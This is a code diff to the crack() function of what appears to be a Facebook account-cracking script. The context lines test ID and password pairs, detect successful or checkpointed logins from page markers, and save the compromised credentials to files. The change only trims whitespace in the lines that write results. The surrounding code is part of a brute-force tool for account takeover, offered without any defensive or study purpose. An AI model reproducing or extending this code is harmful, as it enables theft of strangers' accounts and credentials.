@@ -249,7 +249,7 @@ def crack():
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
 					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
 					ok.append(rax_x+'|'+pw)
-					save.write('  [RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -262,7 +262,7 @@ def crack():
 						nama = data['name']
 						print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ '|' + pw + ' <-> ' + tgllhr)
 						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
-						save.write(' [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
+						save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
@@ -270,7 +270,7 @@ def crack():
 					except:pass
 					print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
 					cp.append(rax_x+'|'+pw)
-					save.write(' [RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
+					save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
 					save.close()
 					break
 					continue
